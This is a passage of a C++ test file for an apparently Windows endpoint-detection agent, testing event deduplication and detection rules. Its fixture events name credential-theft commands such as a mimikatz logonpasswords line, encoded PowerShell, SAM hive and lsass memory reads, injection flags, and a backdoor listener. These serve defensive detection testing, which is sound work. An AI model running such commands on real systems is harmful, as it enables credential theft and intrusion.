    firstListener.fields[field::kListenerProtocol] = "tcp";
    firstListener.fields[field::kListenerPid] = "777";
    firstListener.fields[field::kListenerAction] = "added";
    CHECK(!dedup.IsDuplicate(firstListener));
    Event duplicateListener = firstListener;
    duplicateListener.ts100ns += 500;
    CHECK(dedup.IsDuplicate(duplicateListener));
    Event distinctListenerPort = firstListener;
    distinctListenerPort.fields[field::kListenerPort] = "5555";
    CHECK(!dedup.IsDuplicate(distinctListenerPort));
    Event distinctListenerPid = firstListener;
    distinctListenerPid.fields[field::kListenerPid] = "778";
    CHECK(!dedup.IsDuplicate(distinctListenerPid));

    /* SERVICE_CHANGE: dedup on name + action + image path. */
    Event firstService;
    firstService.type = EDR_EVT_SERVICE_CHANGE;
    firstService.ts100ns = 60000000;
    firstService.processIdentity = "service-guid";
    firstService.fields[field::kServiceName] = "EvilSvc";
    firstService.fields[field::kServiceAction] = "added";
    firstService.fields[field::kServiceImagePath] =
        "C:\\Temp\\evil.dll";
    CHECK(!dedup.IsDuplicate(firstService));
    Event duplicateService = firstService;
    duplicateService.ts100ns += 500;
    CHECK(dedup.IsDuplicate(duplicateService));
    Event removedService = firstService;
    removedService.fields[field::kServiceAction] = "removed";
    CHECK(!dedup.IsDuplicate(removedService));
    Event distinctServicePath = firstService;
    distinctServicePath.fields[field::kServiceImagePath] = "C:\\svc.exe";
    CHECK(!dedup.IsDuplicate(distinctServicePath));

    /* CRITICAL_PROCESS: dedup on image + pid + action. */
    Event firstCritical;
    firstCritical.type = EDR_EVT_CRITICAL_PROCESS;
    firstCritical.ts100ns = 70000000;
    firstCritical.processIdentity = "critical-guid";
    firstCritical.fields[field::kCriticalProcessImage] = "MsMpEng.exe";
    firstCritical.fields[field::kCriticalProcessPid] = "888";
    firstCritical.fields[field::kCriticalProcessAction] = "terminated";
    CHECK(!dedup.IsDuplicate(firstCritical));
    Event duplicateCritical = firstCritical;
    duplicateCritical.ts100ns += 500;
    CHECK(dedup.IsDuplicate(duplicateCritical));
    Event recoveredCritical = firstCritical;
    recoveredCritical.fields[field::kCriticalProcessAction] = "recovered";
    CHECK(!dedup.IsDuplicate(recoveredCritical));
    Event distinctCriticalPid = firstCritical;
    distinctCriticalPid.fields[field::kCriticalProcessPid] = "889";
    CHECK(!dedup.IsDuplicate(distinctCriticalPid));

    /* FILE_INTEGRITY: dedup on path + action + sha256. */
    Event firstFim;
    firstFim.type = EDR_EVT_FILE_INTEGRITY;
    firstFim.ts100ns = 80000000;
    firstFim.processIdentity = "fim-guid";
    firstFim.fields[field::kFimPath] = "C:\\Windows\\System32\\drivers\\etc\\hosts";
    firstFim.fields[field::kFimAction] = "modified";
    firstFim.fields[field::kFimSha256] = "abc123";
    CHECK(!dedup.IsDuplicate(firstFim));
    Event duplicateFim = firstFim;
    duplicateFim.ts100ns += 500;
    CHECK(dedup.IsDuplicate(duplicateFim));
    Event removedFim = firstFim;
    removedFim.fields[field::kFimAction] = "removed";
    CHECK(!dedup.IsDuplicate(removedFim));
    Event distinctFimPath = firstFim;
    distinctFimPath.fields[field::kFimPath] = "C:\\other.txt";
    CHECK(!dedup.IsDuplicate(distinctFimPath));

    /* SHARE_CHANGE: dedup on name + action + path. */
    Event firstShare;
    firstShare.type = EDR_EVT_SHARE_CHANGE;
    firstShare.ts100ns = 90000000;
    firstShare.processIdentity = "share-guid";
    firstShare.fields[field::kShareName] = "Public";
    firstShare.fields[field::kShareAction] = "added";
    firstShare.fields[field::kSharePath] = "C:\\Public";
    CHECK(!dedup.IsDuplicate(firstShare));
    Event duplicateShare = firstShare;
    duplicateShare.ts100ns += 500;
    CHECK(dedup.IsDuplicate(duplicateShare));
    Event removedShare = firstShare;
    removedShare.fields[field::kShareAction] = "removed";
    CHECK(!dedup.IsDuplicate(removedShare));
    Event distinctShareName = firstShare;
    distinctShareName.fields[field::kShareName] = "Backup";
    CHECK(!dedup.IsDuplicate(distinctShareName));

    /* LOCAL_ACCOUNT: dedup on account/group name + action + type. */
    Event firstAccount;
    firstAccount.type = EDR_EVT_LOCAL_ACCOUNT;
    firstAccount.ts100ns = 100000000;
    firstAccount.processIdentity = "account-guid";
    firstAccount.fields[field::kAccountType] = "user";
    firstAccount.fields[field::kAccountName] = "NewUser";
    firstAccount.fields[field::kAccountAction] = "added";
    CHECK(!dedup.IsDuplicate(firstAccount));
    Event duplicateAccount = firstAccount;
    duplicateAccount.ts100ns += 500;
    CHECK(dedup.IsDuplicate(duplicateAccount));
    Event removedAccount = firstAccount;
    removedAccount.fields[field::kAccountAction] = "removed";
    CHECK(!dedup.IsDuplicate(removedAccount));
    Event distinctAccountName = firstAccount;
    distinctAccountName.fields[field::kAccountName] = "OtherUser";
    CHECK(!dedup.IsDuplicate(distinctAccountName));

    /* FIREWALL_RULE: dedup on rule name + action + dir + port. */
    Event firstFirewall;
    firstFirewall.type = EDR_EVT_FIREWALL_RULE;
    firstFirewall.ts100ns = 110000000;
    firstFirewall.processIdentity = "firewall-guid";
    firstFirewall.fields[field::kFirewallRuleName] = "Allow-C2";
    firstFirewall.fields[field::kFirewallAction] = "added";
    firstFirewall.fields[field::kFirewallDir] = "in";
    firstFirewall.fields[field::kFirewallLocalPort] = "4444";
    CHECK(!dedup.IsDuplicate(firstFirewall));
    Event duplicateFirewall = firstFirewall;
    duplicateFirewall.ts100ns += 500;
    CHECK(dedup.IsDuplicate(duplicateFirewall));
    Event removedFirewall = firstFirewall;
    removedFirewall.fields[field::kFirewallAction] = "removed";
    CHECK(!dedup.IsDuplicate(removedFirewall));
    Event distinctFirewallRule = firstFirewall;
    distinctFirewallRule.fields[field::kFirewallRuleName] = "Other";
    CHECK(!dedup.IsDuplicate(distinctFirewallRule));
}

static void TestEventBusOverflowContract() {
    EventBus bus(1);
    Event event;
    CHECK(bus.Push(event));
    CHECK(!bus.Push(event));
    CHECK(bus.DroppedCount() == 1);
}

static void TestMitreAttackMapping() {
    const char* path = "edr-native-test-rules-mitre.json";
    {
        std::ofstream out(path, std::ios::binary);
        out << R"({
          "rules": [{
            "id": "EDR-001",
            "severity": "high",
            "action": "alert",
            "condition": "all",
            "mitre_attack": ["T1059.001", "T1059"],
            "mitre_tactic": ["Execution"],
            "match": {
              "image": { "regex": "(?i)powershell(\\.exe)?$" },
              "command_line": { "contains": "-enc" }
            }
          }]
        })";
    }

    RuleEngine engine;
    engine.LoadFromFile(path);
    CHECK(engine.RuleCount() == 1);

    Event event;
    event.type = EDR_EVT_PROCESS_START;
    event.pid = 4242;
    event.ts100ns = 134296776001230000ULL;
    event.fields[field::kType] = "PROCESS_START";
    event.fields[field::kImage] = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    event.fields[field::kCommandLine] = "powershell -enc AAAA";

    int hits = 0;
    engine.SetAlertCallback([&](const Alert& alert) {
        hits += 1;
        CHECK(alert.ruleId == "EDR-001");
        CHECK(alert.mitreAttack.size() == 2);
        CHECK(alert.mitreAttack[0] == "T1059.001");
        CHECK(alert.mitreAttack[1] == "T1059");
        CHECK(alert.mitreTactic.size() == 1);
        CHECK(alert.mitreTactic[0] == "Execution");
        const std::string line = AlertToJsonLine(alert, false);
        CHECK(line.find("\"mitre_attack\":[\"T1059.001\",\"T1059\"]") != std::string::npos);
        CHECK(line.find("\"mitre_tactic\":[\"Execution\"]") != std::string::npos);
        CHECK(line.find("\"fields\":{") != std::string::npos);
        CHECK(line.back() == '}');
    });
    engine.OnEvent(event);
    CHECK(hits == 1);
    DeleteFileA(path);
}

static void TestProductionDetectionRules() {
    RuleEngine engine;
    engine.LoadFromFile("..\\rules\\rules.json");
    std::vector<std::string> hits;
    engine.SetAlertCallback([&](const Alert& alert) { hits.push_back(alert.ruleId); });

    /* EDR-004: registry key spelling is case-insensitive, but similarly
     * named non-autorun keys and non-registry events must not match. */
    Event runKey;
    runKey.type = EDR_EVT_REG_WRITE;
    runKey.fields[field::kType] = "REG_WRITE";
    runKey.fields[field::kRegKey] =
        "HKCU\\Software\\Microsoft\\Windows\\currentversion\\run\\Updater";
    engine.OnEvent(runKey);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-004") != hits.end());

    hits.clear();
    Event runOnce = runKey;
    runOnce.fields[field::kRegKey] =
        "HKLM\\Software\\Microsoft\\Windows\\CURRENTVERSION\\RUNONCE\\Updater";
    engine.OnEvent(runOnce);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-004") != hits.end());

    hits.clear();
    Event runtimeKey = runKey;
    runtimeKey.fields[field::kRegKey] =
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Runtime\\Updater";
    engine.OnEvent(runtimeKey);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-004") == hits.end());

    hits.clear();
    Event runPrefix = runKey;
    runPrefix.fields[field::kRegKey] =
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Runaway\\Updater";
    engine.OnEvent(runPrefix);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-004") == hits.end());

    hits.clear();
    Event nonRegistry = runKey;
    nonRegistry.type = EDR_EVT_PROCESS_START;
    nonRegistry.fields[field::kType] = "PROCESS_START";
    engine.OnEvent(nonRegistry);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-004") == hits.end());

    hits.clear();

    Event injection;
    injection.type = EDR_EVT_PROCESS_ACCESS;
    injection.fields[field::kType] = "PROCESS_ACCESS";
    injection.fields[field::kCrossProcess] = "true";
    injection.fields[field::kAccessCreateThread] = "true";
    injection.fields[field::kAccessVmOperation] = "true";
    injection.fields[field::kAccessVmWrite] = "true";
    injection.fields[field::kAccessVmRead] = "false";
    injection.fields[field::kTargetImage] = "C:\\Windows\\System32\\notepad.exe";
    engine.OnEvent(injection);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-014") != hits.end());

    hits.clear();
    Event partial = injection;
    partial.fields[field::kAccessVmWrite] = "false";
    engine.OnEvent(partial);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-014") == hits.end());

    hits.clear();
    Event lsass = injection;
    lsass.fields[field::kAccessCreateThread] = "false";
    lsass.fields[field::kAccessVmOperation] = "false";
    lsass.fields[field::kAccessVmWrite] = "false";
    lsass.fields[field::kAccessVmRead] = "true";
    lsass.fields[field::kTargetImage] = "C:\\Windows\\System32\\lsass.exe";
    engine.OnEvent(lsass);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-016") != hits.end());

    hits.clear();
    Event selfAccess = lsass;
    selfAccess.fields[field::kCrossProcess] = "false";
    engine.OnEvent(selfAccess);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-016") == hits.end());

    hits.clear();
    Event remoteThread;
    remoteThread.type = EDR_EVT_THREAD_CREATE;
    remoteThread.fields[field::kType] = "THREAD_CREATE";
    remoteThread.fields[field::kRemoteThread] = "true";
    remoteThread.fields[field::kTargetImage] =
        "C:\\Windows\\explorer.exe";
    remoteThread.fields[field::kStartModule] = "C:\\Windows\\System32\\ntdll.dll";
    engine.OnEvent(remoteThread);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-052") != hits.end());
    CHECK(std::find(hits.begin(), hits.end(), "EDR-053") != hits.end());
    CHECK(std::find(hits.begin(), hits.end(), "EDR-055") == hits.end());

    hits.clear();
    Event lsassThread = remoteThread;
    lsassThread.fields[field::kTargetImage] = "C:\\Windows\\System32\\lsass.exe";
    engine.OnEvent(lsassThread);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-054") != hits.end());

    hits.clear();
    Event sysmonThread = remoteThread;
    sysmonThread.fields[field::kSource] = "sysmon";
    sysmonThread.fields[field::kSysmonEventId] = "8";
    sysmonThread.fields[field::kStartModule] = "";
    engine.OnEvent(sysmonThread);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-055") != hits.end());

    hits.clear();
    Event emptyStartModule = sysmonThread;
    emptyStartModule.fields.erase(field::kStartModule);
    engine.OnEvent(emptyStartModule);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-055") == hits.end());

    hits.clear();
    Event access = injection;
    access.fields[field::kAccessDuplicateHandle] = "true";
    access.fields[field::kAccessVmWrite] = "false";
    access.fields[field::kAccessVmRead] = "false";
    engine.OnEvent(access);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-056") != hits.end());
    CHECK(std::find(hits.begin(), hits.end(), "EDR-057") != hits.end());
    CHECK(std::find(hits.begin(), hits.end(), "EDR-059") == hits.end());

    hits.clear();
    Event lsassQuery = lsass;
    lsassQuery.fields[field::kAccessQueryInformation] = "true";
    engine.OnEvent(lsassQuery);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-058") != hits.end());

    hits.clear();
    Event vm = injection;
    vm.fields[field::kAccessVmRead] = "true";
    engine.OnEvent(vm);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-059") != hits.end());

    hits.clear();
    Event threadSelf = remoteThread;
    threadSelf.fields[field::kRemoteThread] = "false";
    engine.OnEvent(threadSelf);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-052") == hits.end());

    hits.clear();
    Event service;
    service.type = EDR_EVT_REG_WRITE;
    service.fields[field::kType] = "REG_WRITE";
    service.fields[field::kSource] = "sysmon";
    service.fields[field::kSysmonEventId] = "13";
    service.fields[field::kRegOperation] = "SetValue";
    service.fields[field::kRegKey] =
        "HKLM\\System\\CurrentControlSet\\Services\\Example\\ImagePath";
    engine.OnEvent(service);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-017") != hits.end());

    hits.clear();
    Event nonSysmonService = service;
    nonSysmonService.fields[field::kSource] = "registry_watch";
    engine.OnEvent(nonSysmonService);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-017") == hits.end());

    hits.clear();
    Event taskCmd;
    taskCmd.type = EDR_EVT_PROCESS_START;
    taskCmd.fields[field::kType] = "PROCESS_START";
    taskCmd.fields[field::kImage] = "C:\\Windows\\System32\\schtasks.exe";
    taskCmd.fields[field::kCommandLine] = "schtasks /CREATE /tn Update";
    engine.OnEvent(taskCmd);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-011") != hits.end());

    hits.clear();
    Event taskPowerShell = taskCmd;
    taskPowerShell.fields[field::kImage] = "C:\\Program Files\\PowerShell\\7\\pwsh.exe";
    taskPowerShell.fields[field::kCommandLine] = "Register-ScheduledTask -TaskName Update";
    engine.OnEvent(taskPowerShell);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-018") != hits.end());

    hits.clear();
    taskPowerShell.fields[field::kCommandLine] = "Get-ScheduledTask";
    engine.OnEvent(taskPowerShell);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-018") == hits.end());

    hits.clear();
    Event taskFile;
    taskFile.type = EDR_EVT_FILE_CREATE;
    taskFile.fields[field::kType] = "FILE_CREATE";
    taskFile.fields[field::kSource] = "sysmon";
    taskFile.fields[field::kSysmonEventId] = "11";
    taskFile.fields[field::kFilePath] =
        "C:\\Windows\\System32\\Tasks\\Microsoft\\Update";
    engine.OnEvent(taskFile);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-019") != hits.end());

    hits.clear();
    taskFile.fields[field::kFilePath] = "C:\\Windows\\Temp\\Update";
    engine.OnEvent(taskFile);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-019") == hits.end());

    hits.clear();
    Event anomalousSvchost;
    anomalousSvchost.type = EDR_EVT_PROCESS_START;
    anomalousSvchost.fields[field::kType] = "PROCESS_START";
    anomalousSvchost.fields[field::kImage] = "C:\\Windows\\System32\\svchost.exe";
    anomalousSvchost.fields[field::kParentImage] = "C:\\Windows\\explorer.exe";
    engine.OnEvent(anomalousSvchost);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-015") != hits.end());

    hits.clear();
    anomalousSvchost.fields[field::kParentImage] =
        "C:\\Windows\\System32\\services.exe";
    engine.OnEvent(anomalousSvchost);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-015") == hits.end());

    hits.clear();
    Event amsi;
    amsi.fields[field::kAmsiVerdict] = "detected";
    engine.OnEvent(amsi);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-031") != hits.end());
    bool checkedMetadata = false;
    engine.SetAlertCallback([&](const Alert& alert) {
        if (alert.ruleId == "EDR-031") {
            CHECK(alert.severity == "high");
            CHECK(alert.mitreAttack.empty() && alert.mitreTactic.empty());
            checkedMetadata = true;
        }
    });
    engine.OnEvent(amsi);
    CHECK(checkedMetadata);
    amsi.fields[field::kAmsiVerdict] = "blocked_by_admin";
    checkedMetadata = false;
    engine.OnEvent(amsi);
    CHECK(!checkedMetadata);
    engine.SetAlertCallback([&](const Alert& alert) {
        hits.push_back(alert.ruleId);
    });

    hits.clear();
    Event outsideDriver;
    outsideDriver.type = EDR_EVT_IMAGE_LOAD;
    outsideDriver.fields[field::kType] = "IMAGE_LOAD";
    outsideDriver.fields[field::kImageLoadType] = "load";
    outsideDriver.fields[field::kImageLoaded] =
        "C:\\Users\\Public\\test-driver.sys";
    engine.OnEvent(outsideDriver);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-042") != hits.end());

    for (const char* path : {
            "C:\\Windows\\System32\\drivers\\test-driver.sys",
            "C:\\Windows\\SysWOW64\\drivers\\test-driver.sys",
            "C:\\Windows\\WinSxS\\amd64_test\\test-driver.sys",
            "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\test-driver.sys"}) {
        hits.clear();
        Event systemDriver = outsideDriver;
        systemDriver.fields[field::kImageLoaded] = path;
        engine.OnEvent(systemDriver);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-042") == hits.end());
    }

    hits.clear();
    Event lsassRead;
    lsassRead.type = EDR_EVT_PROCESS_READ;
    lsassRead.fields[field::kType] = "PROCESS_READ";
    lsassRead.fields[field::kCrossProcess] = "true";
    lsassRead.fields[field::kTargetImage] = "C:\\Windows\\System32\\lsass.exe";
    engine.OnEvent(lsassRead);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-060") != hits.end());
    CHECK(lsassRead.fields.find(field::kMemorySize) == lsassRead.fields.end());
    CHECK(std::find(hits.begin(), hits.end(), "EDR-073") == hits.end());

    hits.clear();
    Event bareLsassRead = lsassRead;
    bareLsassRead.fields[field::kTargetImage] = "lsass.exe";
    engine.OnEvent(bareLsassRead);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-060") == hits.end());

    hits.clear();
    Event selfLsassRead = lsassRead;
    selfLsassRead.fields[field::kCrossProcess] = "false";
    engine.OnEvent(selfLsassRead);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-060") == hits.end());

    hits.clear();
    Event notepadRead = lsassRead;
    notepadRead.fields[field::kTargetImage] = "C:\\Windows\\System32\\notepad.exe";
    engine.OnEvent(notepadRead);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-060") == hits.end());
    CHECK(std::find(hits.begin(), hits.end(), "EDR-061") == hits.end());

    hits.clear();
    Event winlogonRead = lsassRead;
    winlogonRead.fields[field::kTargetImage] = "C:\\Windows\\System32\\winlogon.exe";
    engine.OnEvent(winlogonRead);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-061") != hits.end());

    hits.clear();
    Event hiveRead;
    hiveRead.type = EDR_EVT_FILE_READ;
    hiveRead.fields[field::kType] = "FILE_READ";
    hiveRead.fields[field::kFilePath] = "C:\\Windows\\System32\\config\\SAM";
    hiveRead.fields[field::kImage] = "C:\\Users\\Public\\tool.exe";
    engine.OnEvent(hiveRead);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-062") != hits.end());

    hits.clear();
    Event svchostHiveRead = hiveRead;
    svchostHiveRead.fields[field::kImage] = "C:\\Windows\\System32\\svchost.exe";
    engine.OnEvent(svchostHiveRead);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-062") == hits.end());

    hits.clear();
    Event mimikatz;
    mimikatz.type = EDR_EVT_PROCESS_START;
    mimikatz.fields[field::kType] = "PROCESS_START";
    mimikatz.fields[field::kCommandLine] = "mimikatz.exe sekurlsa::logonpasswords";
    engine.OnEvent(mimikatz);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-063") != hits.end());

    hits.clear();
    Event cleanProcess = mimikatz;
    cleanProcess.fields[field::kCommandLine] = "cmd.exe /c dir";
    engine.OnEvent(cleanProcess);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-063") == hits.end());

    hits.clear();
    Event dnsEntropy;
    dnsEntropy.type = EDR_EVT_DNS_QUERY;
    dnsEntropy.fields[field::kType] = "DNS_QUERY";
    dnsEntropy.fields[field::kDnsEntropy] = "3.500000";
    dnsEntropy.fields[field::kDnsSubdomainCount] = "5";
    engine.OnEvent(dnsEntropy);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-082") != hits.end());

    hits.clear();
    Event dnsSubdomains;
    dnsSubdomains.type = EDR_EVT_DNS_QUERY;
    dnsSubdomains.fields[field::kType] = "DNS_QUERY";
    dnsSubdomains.fields[field::kDnsSubdomainCount] = "10";
    engine.OnEvent(dnsSubdomains);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-083") != hits.end());

    hits.clear();
    Event dnsLabel;
    dnsLabel.type = EDR_EVT_DNS_QUERY;
    dnsLabel.fields[field::kType] = "DNS_QUERY";
    dnsLabel.fields[field::kDnsMaxLabelLength] = "53";
    engine.OnEvent(dnsLabel);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-084") != hits.end());

    hits.clear();
    Event dnsTxt;
    dnsTxt.type = EDR_EVT_DNS_QUERY;
    dnsTxt.fields[field::kType] = "DNS_QUERY";
    dnsTxt.fields[field::kDnsQueryType] = "TXT";
    engine.OnEvent(dnsTxt);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-085") != hits.end());

    hits.clear();
    Event dnsNoPort;
    dnsNoPort.type = EDR_EVT_DNS_QUERY;
    dnsNoPort.fields[field::kType] = "DNS_QUERY";
    engine.OnEvent(dnsNoPort);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-086") == hits.end());

    hits.clear();
    Event dnsNonstandardPort;
    dnsNonstandardPort.type = EDR_EVT_DNS_QUERY;
    dnsNonstandardPort.fields[field::kType] = "DNS_QUERY";
    dnsNonstandardPort.fields[field::kDstPort] = "5353";
    engine.OnEvent(dnsNonstandardPort);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-086") == hits.end());

    hits.clear();
    Event apcInjection;
    apcInjection.type = EDR_EVT_APC_INJECT;
    apcInjection.fields[field::kType] = "APC_INJECT";
    apcInjection.fields[field::kCrossProcess] = "true";
    engine.OnEvent(apcInjection);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-064") != hits.end());

    hits.clear();
    Event apcSelf = apcInjection;
    apcSelf.fields[field::kCrossProcess] = "false";
    engine.OnEvent(apcSelf);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-064") == hits.end());

    hits.clear();
    Event apcLsass = apcInjection;
    apcLsass.fields[field::kTargetImage] = "C:\\Windows\\System32\\lsass.exe";
    engine.OnEvent(apcLsass);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-065") != hits.end());

    hits.clear();
    Event contextHijack;
    contextHijack.type = EDR_EVT_CONTEXT_CHANGE;
    contextHijack.fields[field::kType] = "CONTEXT_CHANGE";
    contextHijack.fields[field::kCrossProcess] = "true";
    engine.OnEvent(contextHijack);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-066") != hits.end());

    hits.clear();
    Event memoryWriteLsass;
    memoryWriteLsass.type = EDR_EVT_MEMORY_WRITE;
    memoryWriteLsass.fields[field::kType] = "MEMORY_WRITE";
    memoryWriteLsass.fields[field::kCrossProcess] = "true";
    memoryWriteLsass.fields[field::kTargetImage] =
        "C:\\Windows\\System32\\lsass.exe";
    engine.OnEvent(memoryWriteLsass);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-067") != hits.end());

    hits.clear();
    Event memoryWriteNotepad = memoryWriteLsass;
    memoryWriteNotepad.fields[field::kTargetImage] =
        "C:\\Windows\\System32\\notepad.exe";
    engine.OnEvent(memoryWriteNotepad);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-068") != hits.end());
    CHECK(std::find(hits.begin(), hits.end(), "EDR-067") == hits.end());

    hits.clear();
    Event usb;
    usb.type = EDR_EVT_USB_DEVICE;
    usb.fields[field::kType] = "USB_DEVICE";
    usb.fields[field::kUsbAction] = "added";
    usb.fields[field::kUsbDriveLetter] = "E:";
    engine.OnEvent(usb);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-087") != hits.end());

    hits.clear();
    usb.fields[field::kUsbAction] = "removed";
    engine.OnEvent(usb);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-087") == hits.end());

    hits.clear();
    Event listener;
    listener.type = EDR_EVT_NET_LISTENER;
    listener.fields[field::kType] = "NET_LISTENER";
    listener.fields[field::kListenerAction] = "added";
    listener.fields[field::kListenerProtocol] = "tcp";
    listener.fields[field::kListenerPort] = "4444";
    listener.fields[field::kListenerProcess] =
        "C:\\Users\\Public\\backdoor.exe";
    engine.OnEvent(listener);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-088") != hits.end());
    CHECK(std::find(hits.begin(), hits.end(), "EDR-089") != hits.end());

    hits.clear();
    Event svchostListener = listener;
    svchostListener.fields[field::kListenerProcess] =
        "C:\\Windows\\System32\\svchost.exe";
    engine.OnEvent(svchostListener);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-088") == hits.end());

    hits.clear();
    Event lowPortListener = listener;
    lowPortListener.fields[field::kListenerPort] = "80";
    engine.OnEvent(lowPortListener);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-089") == hits.end());
    CHECK(std::find(hits.begin(), hits.end(), "EDR-088") != hits.end());

    hits.clear();
    Event removedListener = listener;
    removedListener.fields[field::kListenerAction] = "removed";
    engine.OnEvent(removedListener);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-088") == hits.end());
    CHECK(std::find(hits.begin(), hits.end(), "EDR-089") == hits.end());

    hits.clear();
    Event serviceChange;
    serviceChange.type = EDR_EVT_SERVICE_CHANGE;
    serviceChange.fields[field::kType] = "SERVICE_CHANGE";
    serviceChange.fields[field::kServiceAction] = "added";
    serviceChange.fields[field::kServiceName] = "EvilSvc";
    serviceChange.fields[field::kServiceImagePath] =
        "C:\\ProgramData\\evil\\evil.dll";
    engine.OnEvent(serviceChange);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-090") != hits.end());

    hits.clear();
    Event systemService = serviceChange;
    systemService.fields[field::kServiceImagePath] =
        "C:\\Windows\\System32\\svchost.exe";
    engine.OnEvent(systemService);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-090") == hits.end());

    hits.clear();
    Event removedService = serviceChange;
    removedService.fields[field::kServiceAction] = "removed";
    engine.OnEvent(removedService);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-090") == hits.end());

    hits.clear();
    Event critical;
    critical.type = EDR_EVT_CRITICAL_PROCESS;
    critical.fields[field::kType] = "CRITICAL_PROCESS";
    critical.fields[field::kCriticalProcessAction] = "terminated";
    critical.fields[field::kCriticalProcessImage] = "MsMpEng.exe";
    engine.OnEvent(critical);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-091") != hits.end());

    hits.clear();
    Event recoveredCritical = critical;
    recoveredCritical.fields[field::kCriticalProcessAction] = "recovered";
    engine.OnEvent(recoveredCritical);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-091") == hits.end());

    hits.clear();
    Event fim;
    fim.type = EDR_EVT_FILE_INTEGRITY;
    fim.fields[field::kType] = "FILE_INTEGRITY";
    fim.fields[field::kFimAction] = "modified";
    fim.fields[field::kFimPath] = "C:\\Windows\\System32\\drivers\\etc\\hosts";
    fim.fields[field::kFimSha256] = "deadbeef";
    engine.OnEvent(fim);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-092") != hits.end());

    hits.clear();
    fim.fields[field::kFimAction] = "added";
    engine.OnEvent(fim);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-092") == hits.end());

    // New SMB share with a non-default path -> EDR-096 (medium).
    hits.clear();
    Event share;
    share.type = EDR_EVT_SHARE_CHANGE;
    share.fields[field::kType] = "SHARE_CHANGE";
    share.fields[field::kShareAction] = "added";
    share.fields[field::kShareName] = "SecretShare";
    share.fields[field::kSharePath] = "C:\\SecretShare";
    share.fields[field::kShareType] = "disk";
    engine.OnEvent(share);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-096") != hits.end());

    // Windows-default share path (Public/Users) is excluded -> no EDR-096.
    hits.clear();
    Event defaultShare = share;
    defaultShare.fields[field::kSharePath] = "C:\\Users\\Public";
    engine.OnEvent(defaultShare);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-096") == hits.end());

    // Removed shares never hit EDR-096.
    hits.clear();
    Event removedShare = share;
    removedShare.fields[field::kShareAction] = "removed";
    engine.OnEvent(removedShare);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-096") == hits.end());

    // FIM: new executable created -> EDR-093 (medium).
    hits.clear();
    Event newExe;
    newExe.type = EDR_EVT_FILE_INTEGRITY;
    newExe.fields[field::kType] = "FILE_INTEGRITY";
    newExe.fields[field::kFimAction] = "added";
    newExe.fields[field::kFimPath] = "C:\\Windows\\Temp\\evil.exe";
    engine.OnEvent(newExe);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-093") != hits.end());

    // Non-executable additions do not hit EDR-093.
    hits.clear();
    Event newTxt = newExe;
    newTxt.fields[field::kFimPath] = "C:\\Windows\\Temp\\notes.txt";
    engine.OnEvent(newTxt);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-093") == hits.end());

    // Removals never hit EDR-093.
    hits.clear();
    Event removedExe = newExe;
    removedExe.fields[field::kFimAction] = "removed";
    engine.OnEvent(removedExe);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-093") == hits.end());

